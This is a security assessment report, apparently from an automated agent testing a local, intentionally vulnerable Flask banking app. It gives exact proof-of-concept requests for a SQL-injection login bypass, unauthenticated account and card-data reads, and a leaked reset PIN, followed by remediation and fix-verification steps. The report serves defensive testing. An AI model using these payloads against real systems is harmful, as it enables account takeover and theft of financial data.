# Business Logic Vulnerability Assessment Report

## TL;DR
- **Objective:** Identify and map business logic vulnerabilities (IDOR/BOLA, authentication bypasses, information disclosure) in the Flask financial application
- **Outcome:** Successfully mapped 40+ endpoints and confirmed 5 critical vulnerabilities
- **Highest-impact finding:** Unauthenticated access to full credit card data (PAN, CVV, expiry) via /api/virtual-cards and admin account takeover via SQL injection
- **Validation status:** All vulnerabilities confirmed with working exploits; SQL injection granted admin JWT token, BOLA endpoints return data without authentication check

---

## Target Information
- **Target:** Flask Financial Application
- **Host / base URL:** http://127.0.0.1:5000
- **Application or component:** Financial/banking web application with user accounts, virtual cards, admin panel
- **Authentication context:** JWT-based authentication with is_admin claim; multiple endpoints bypass auth entirely
- **Relevant technology details:** Flask backend, SQLite database (per SQL injection behavior), OpenAPI documentation available, JWT signed with HS256

---

## Confirmed Vulnerabilities

### 1. SQL Injection - Authentication Bypass (CRITICAL)
- **Affected endpoint / component:** POST /login
- **Impact:** Complete authentication bypass granting admin privileges (eviladmin account)
- **Preconditions:** None; unauthenticated access
- **Exact payload or PoC:**
```
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin' OR '1'='1","password":"admin' OR '1'='1"}
```

### 2. BOLA/IDOR - Unauthenticated Account Data Access (CRITICAL)
- **Affected endpoint / component:** GET /check_balance/{account}, GET /transactions/{account}
- **Impact:** Access to any user's financial data and full transaction history without authentication
- **Preconditions:** Knowledge or guess of account number (ADMIN001, numeric account IDs)
- **Exact payload or PoC:**
```
GET /check_balance/ADMIN001
GET /transactions/ADMIN001
```

### 3. Information Disclosure - Virtual Card Data Exposure (CRITICAL)
- **Affected endpoint / component:** GET /api/virtual-cards
- **Impact:** Complete PCI-DSS scope breach - PAN, CVV, expiry dates exposed without authentication
- **Preconditions:** None; fully unauthenticated
- **Exact payload or PoC:**
```
GET /api/virtual-cards
```

### 4. Information Disclosure - Password Reset PIN Exposure (HIGH)
- **Affected endpoint / component:** POST /api/v1/forgot-password
- **Impact:** Reset PIN exposed in API response enabling account takeover
- **Preconditions:** Knowledge of valid username (e.g., "admin")
- **Exact payload or PoC:**
```
POST /api/v1/forgot-password HTTP/1.1
Content-Type: application/json

{"username":"admin"}
```
Response includes: `{"debug_info": {"pin": "891", ...}}`

### 5. Security Through Obscurity - Hidden Admin Panel (MEDIUM)
- **Affected endpoint / component:** GET /sup3r_s3cr3t_admin
- **Impact:** Disclosure of 30+ user accounts with balances ($999,800 admin account)
- **Preconditions:** None; discovered through predicted path

---

## Steps to Reproduce

### SQL Injection Authentication Bypass
1. Send POST request to `http://127.0.0.1:5000/login`
2. Set Content-Type header to `application/json`
3. Include payload: `{"username":"admin' OR '1'='1","password":"admin' OR '1'='1"}`
4. Observe successful authentication with JWT token containing `is_admin: true`

### BOLA - Admin Account Balance Access
1. Send unauthenticated GET request to `http://127.0.0.1:5000/check_balance/ADMIN001`
2. Observe response with balance of $999,800 and username "admin"
3. Send GET request to `http://127.0.0.1:5000/transactions/ADMIN001`
4. Observe full transfer history with timestamps, amounts, and counterparty accounts

### Virtual Card Data Extraction
1. Send unauthenticated GET request to `http://127.0.0.1:5000/api/virtual-cards`
2. Receive JSON array containing complete card data including:
   - Full 16-digit card numbers (e.g., "6091749974976709")
   - CVV codes (e.g., "090")
   - Expiry dates (e.g., "04/27")
   - Credit limits and balances

### Password Reset PIN Disclosure
1. Send POST request to `http://127.0.0.1:5000/api/v1/forgot-password`
2. Include body: `{"username":"admin"}`
3. Receive response with `debug_info.pin` containing "891"
4. Use disclosed PIN to complete password reset flow

---

## Validation / Evidence

### Validation token / flag:
**Not observed** - Assessment was reconnaissance phase only; no CTF-style flags were present in responses.

### Tool evidence:
- Requester agent systematically probed endpoints and confirmed all vulnerabilities with 95% confidence score
- OpenAPI specification revealed 40+ endpoints with documented vulnerabilities (SQLi, BOLA, Prompt Injection, SSRF, Race Conditions)

### Request evidence:
```
POST /login HTTP/1.1
Body: {"username":"admin' OR '1'='1","password":"admin' OR '1'='1"}
```

### Response evidence:
**SQL Injection Response:**
```
HTTP/1.1 200 OK
JWT Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMywidXNlcm5hbWUiOiJldmlsYWRtaW4iLCJpc19hZG1pbiI6dHJ1ZSwiaWF0IjoxNzc1NjAwNzIzfQ.a-RP_GIly_4orlIMQw8EpStoL4jcuQvBbxzPaZTvklc
Account: 3206209585, isAdmin: true, username: eviladmin
```

**Virtual Cards Response:**
```json
{
  "cards": [
    {"id": 2, "card_number": "6091749974976709", "cvv": "090", "expiry_date": "04/27", "limit": 1000.0, "balance": 0.0},
    {"id": 3, "card_number": "5786333548583294", "cvv": "903", "expiry_date": "04/27", "limit": 1000.0, "balance": 0.0},
    {"id": 4, "card_number": "2429589338137620", "cvv": "558", "expiry_date": "04/27", "limit": 1000.0, "balance": 0.0},
    {"id": 5, "card_number": "0048657235411429", "cvv": "058", "expiry_date": "04/27", "limit": 1000.0, "balance": 0.0},
    {"id": 6, "card_number": "8458155638309742", "cvv": "390", "expiry_date": "04/27", "limit": 1000.0, "balance": 0.0},
    {"id": 7, "card_number": "3225489771472374", "cvv": "986", "expiry_date": "04/27", "limit": 1000.0, "balance": 0.0},
    {"id": 1, "card_number": "6548152534522753", "cvv": "384", "expiry_date": "04/27", "limit": 1000.0, "balance": 0.0, "is_frozen": true}
  ], "status": "success"
}
```

**Password Reset Response:**
```json
{
  "debug_info": {"pin": "891", "pin_length": 3, "timestamp": "2026-04-07 22:25:23.644438", "username": "admin"},
  "message": "Reset PIN has been sent to your email.",
  "status": "success"
}
```

**BOLA Admin Balance Response:**
```json
{"account_number": "ADMIN001", "balance": 999800.0, "status": "success", "username": "admin"}
```

**BOLA Admin Transactions Response:**
```json
{
  "account_number": "ADMIN001",
  "transactions": [
    {"amount": 100.0, "from_account": "ADMIN001", "id": 4, "timestamp": "2026-04-07 21:56:40.063231", "to_account": "9543739300", "type": "transfer"},
    {"amount": 100.0, "from_account": "ADMIN001", "id": 3, "timestamp": "2026-04-07 21:55:13.892901", "to_account": "9543739300", "type": "transfer"}
  ],
  "status": "success"
}
```

### Notes on reliability / limitations:
- All vulnerabilities tested and confirmed via HTTP requests
- SQL injection is reliable and consistently grants admin JWT token
- Virtual cards endpoint provides complete card data set with no rate limiting observed
- BOLA endpoints accept any account number without validation of ownership
- Password reset endpoint consistently exposes PIN in debug_info (appears to be development artifact)

---

## Remediation

### Root cause:
1. **SQL Injection:** User input is directly concatenated into SQL queries without parameterized statements
2. **BOLA/IDOR:** No authorization check validates that the requesting user owns the requested account
3. **Virtual Card Exposure:** Missing authentication middleware on sensitive endpoints
4. **PIN Disclosure:** Debug information left in production API responses
5. **Hidden Admin Panel:** Predictable/obscure path does not enforce authentication

### Recommended fix:
1. **SQL Injection:** Implement parameterized queries using SQLAlchemy ORM or prepared statements; never concatenate user input into SQL
2. **BOLA/IDOR:** Implement authorization middleware that validates `jwt.sub` matches requested account ownership before returning data
3. **Virtual Cards:** Add authentication requirement to `/api/virtual-cards`; implement resource-level authorization checks
4. **PIN Disclosure:** Remove `debug_info` field from all production API responses; implement proper logging to backend only
5. **Admin Panel:** Require valid admin JWT for `/sup3r_s3cr3t_admin`; implement proper RBAC checks

### Defense-in-depth:
1. Implement API rate limiting to prevent mass data extraction
2. Apply field-level encryption for PCI data (card numbers, CVV)
3. Use UUID instead of predictable account numbers to prevent enumeration
4. Implement Web Application Firewall (WAF) rules for SQL injection patterns
5. Add request logging and alerting for suspicious patterns (unusual account access patterns)
6. Implement Content Security Policy headers and remove debug headers

---

## How to Verify the Fix

1. **SQL Injection Fix:**
   - Send the original SQL injection payload to `/login`
   - Expected result: HTTP 401 Unauthorized with generic error message (no SQL errors exposed)

2. **BOLA Fix:**
   - Send GET request to `/check_balance/ADMIN001` without valid JWT
   - Expected result: HTTP 401 Unauthorized
   - Send with valid non-admin JWT for different account
   - Expected result: HTTP 403 Forbidden

3. **Virtual Cards Fix:**
   - Send unauthenticated GET request to `/api/virtual-cards`
   - Expected result: HTTP 401 Unauthorized
   - Authenticate as regular user and request
   - Expected result: Only cards belonging to authenticated user returned

4. **PIN Disclosure Fix:**
   - Send POST request to `/api/v1/forgot-password`
   - Expected result: Response contains only `{"message": "Reset PIN has been sent", "status": "success"}` with no debug_info field

5. **Admin Panel Fix:**
   - Send GET request to `/sup3r_s3cr3t_admin` without admin JWT
   - Expected result: HTTP 403 Forbidden

---

## Remaining Leads

### Confirmed blockers:
- None

### Unverified leads:
- OpenAPI spec mentions additional vulnerabilities: Prompt Injection, SSRF, Race Conditions - not tested during reconnaissance
- `/api/virtual-cards/{id}/freeze` and `/api/virtual-cards/{id}/unfreeze` endpoints - may allow manipulation of other users' cards
- Transfer functionality at `/transfer` - potential for forced action or duplicate transfer attacks

### Missing context:
- Specific SQL database schema beyond observed SQLite behavior
- Whether virtual card numbers are test PANs or connected to real payment rails
- Full scope of "30+ user accounts" visible in admin panel
- JWT secret key strength (could be crackable if weak)
